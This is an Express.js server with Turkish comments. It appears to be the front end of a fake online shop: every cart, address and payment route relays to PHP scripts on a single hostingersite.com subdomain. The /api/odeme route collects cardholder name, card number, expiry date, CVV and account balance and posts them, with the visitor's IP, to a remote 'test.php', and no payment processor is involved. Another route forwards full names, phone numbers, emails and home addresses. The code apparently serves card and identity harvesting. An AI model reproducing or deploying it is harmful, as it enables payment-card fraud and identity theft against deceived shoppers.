const express = require('express');
const axios = require('axios');
const cookieParser = require('cookie-parser');
const path = require('path');
const cors = require('cors');
const qs = require('querystring');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 3000;

app.use(cookieParser());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(cors());

// ✅ Tek ve güvenli IP alma fonksiyonu
function getClientIp(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    return forwarded.split(',')[0].trim();
  }
  const rawIp = req.connection.remoteAddress || '127.0.0.1';
  return rawIp.replace(/^::ffff:/, '');
}

// -------------------- ROUTES ------------------------

app.get('/', async (req, res) => {
  try {
    const clientIp = getClientIp(req);
    const response = await axios.post(
      'https://forestgreen-rook-759809.hostingersite.com/dmn/index.php',
      qs.stringify({ ip: clientIp }),
      {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      }
    );
    res.send(response.data);
  } catch (error) {
    console.error('Veri çekme hatası:', error.message);
    res.status(500).send('Sunucudan veri alınamadı.');
  }
});

app.get('/sepet', async (req, res) => {
  try {
    const clientIp = getClientIp(req);
    const response = await axios.post(
      'https://forestgreen-rook-759809.hostingersite.com/dmn/sepet.php',
      qs.stringify({ ip: clientIp }),
      {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      }
    );
    res.send(response.data);
  } catch (error) {
    console.error('Sepet çekme hatası:', error.message);
    res.status(500).send('Sunucudan veri alınamadı.');
  }
});

app.get('/adres', async (req, res) => {
  try {
    const clientIp = getClientIp(req);
    const response = await axios.post(
      'https://forestgreen-rook-759809.hostingersite.com/dmn/adres.php',
      qs.stringify({ ip: clientIp }),
      {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      }
    );
    res.send(response.data);
  } catch (error) {
    console.error('Adres çekme hatası:', error.message);
    res.status(500).send('Sunucudan veri alınamadı.');
  }
});

app.get('/odeme', async (req, res) => {
  try {
    const clientIp = getClientIp(req);
    const response = await axios.post(
      'https://forestgreen-rook-759809.hostingersite.com/dmn/odeme.php',
      qs.stringify({ ip: clientIp }),
      {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      }
    );
    res.send(response.data);
  } catch (error) {
    console.error('Ödeme sayfası hatası:', error.message);
    res.status(500).send('Sunucudan veri alınamadı.');
  }
});

app.post('/veri', async (req, res) => {
  try {
    const clientIp = getClientIp(req);
    const response = await axios.post(
      `https://forestgreen-rook-759809.hostingersite.com/dmn/veri.php?ip=${clientIp}`
    );
    res.send(response.data);
  } catch (error) {
    console.error('PHP sunucusuna bağlanılamadı:', error.message);
    res.status(500).send('sunucu_hatasi');
  }
});

app.post('/api/sepet/ekle', (req, res) => {
  const urun_id = req.body.urun_id;
  const ip = getClientIp(req);

  axios.post(
    'https://forestgreen-rook-759809.hostingersite.com/dmn/request.php',
    qs.stringify({ action: 'sepet_ekle', urun_id, ip }),
    {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest'
      }
    }
  )
    .then(response => res.json({ status: response.data.trim() }))
    .catch(error => {
      console.error('Sepete ekleme hatası:', error.message);
      res.json({ status: 'fail' });
    });
});

app.post('/api/sepet/sil', (req, res) => {
  const urun_id = req.body.urun_id;
  const ip = getClientIp(req);

  axios.post(
    'https://forestgreen-rook-759809.hostingersite.com/dmn/request.php?action=sepet_sil',
    qs.stringify({ urun_id, ip }),
    {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest'
      }
    }
  )
    .then(response => res.json({ status: response.data.trim() }))
    .catch(error => {
      console.error('Sepet silme hatası:', error.message);
      res.json({ status: 'fail' });
    });
});

app.post('/api/adres', (req, res) => {
  const ip = getClientIp(req);

  const data = {
    addressType: req.body.addressType || 'CONSUMER',
    isDelivery: req.body.isDelivery || 'true',
    addressClass: req.body.addressClass,
    cityCode: req.body.cityCode,
    townCode: req.body.townCode,
    districtCode: req.body.districtCode,
    boulevard: req.body.boulevard,
    building: req.body.building,
    floor: req.body.floor,
    appartment: req.body.appartment,
    streetname: req.body.streetname,
    firstName: req.body.firstName,
    lastName: req.body.lastName,
    mobilePhoneNumber: req.body.mobilePhoneNumber,
    email: req.body.email,
    ip
  };

  axios.post(
    'https://forestgreen-rook-759809.hostingersite.com/dmn/request.php?action=adres',
    qs.stringify(data),
    {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest'
      }
    }
  )
    .then(() => res.redirect('/adres'))
    .catch(error => {
      console.error('Adres gönderme hatası:', error.message);
      res.status(500).json({ status: 'fail' });
    });
});

app.post('/api/adres/sil', (req, res) => {
  const ip_adresi = req.body.ip_adresi || getClientIp(req);

  axios.post(
    'https://forestgreen-rook-759809.hostingersite.com/dmn/sil_adres.php',
    qs.stringify({ ip_adresi }),
    {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest'
      }
    }
  )
    .then(response => {
      const success = response.data.success;
      if (success === true) {
        res.json({ success: true });
      } else {
        res.json({ success: false, message: 'Silme başarısız: ' + response.data.message });
      }
    })
    .catch(error => {
      console.error('Adres silme hatası:', error.message);
      res.status(500).json({ success: false, message: 'Sunucu hatası oluştu.' });
    });
});

app.post('/api/odeme', (req, res) => {
  const ip = getClientIp(req);
  const { isim_soyisim, kredi_karti, skt, cvv, bakiye } = req.body;

  axios.post(
    'https://forestgreen-rook-759809.hostingersite.com/dmn/test.php',
    qs.stringify({ isim_soyisim, kredi_karti, skt, cvv, bakiye, ip_adresi: ip }),
    {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest'
      }
    }
  )
    .then(response => res.send(response.data))
    .catch(error => {
      console.error('Ödeme hatası:', error.message);
      res.status(500).send('fail');
    });
});

app.listen(port, () => {
  console.log(`Web sunucusu http://localhost:${port} adresinde çalışıyor.`);
});
